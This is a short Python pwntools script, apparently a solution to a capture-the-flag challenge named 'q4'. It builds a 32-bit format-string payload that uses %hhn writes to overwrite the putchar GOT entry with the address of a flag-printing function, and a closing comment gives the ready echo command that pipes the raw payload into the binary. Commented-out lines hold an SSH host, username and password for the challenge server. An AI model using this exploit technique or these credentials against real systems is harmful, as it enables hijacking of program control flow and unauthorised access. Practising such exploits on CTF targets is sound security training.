from pwn import *

# user = "q4"
# pw = "q60SIMpLlej9eq49"

# s = ssh(host='ctfq.u1tramarine.blue', port=10004, user=user, password=pw)
# s.set_working_directory(b'/home/')

def fmtstr_32(addr1, addr2, x):
    payload = b''
    for i in range(4):
        payload += p32(addr1+i)
    n = len(payload)
    for i in range(4):
        l = (addr2&0xff) - n
        l &= 0xff
        s = '%{}c%{}$hhn'.format(l, x+i)
        payload += s.encode()
        n += l
        addr2 >>= 8
    return payload

putchar_got = 0x80499e0
flag = 0x08048691

payload = fmtstr_32(putchar_got, flag, 6)

print(payload)

# $ echo -e '\xe0\x99\x04\x08\xe1\x99\x04\x08\xe2\x99\x04\x08\xe3\x99\x04\x08%129c%6$hhn%245c%7$hhn%126c%8$hhn%4c%9$hhn' | ./q4 
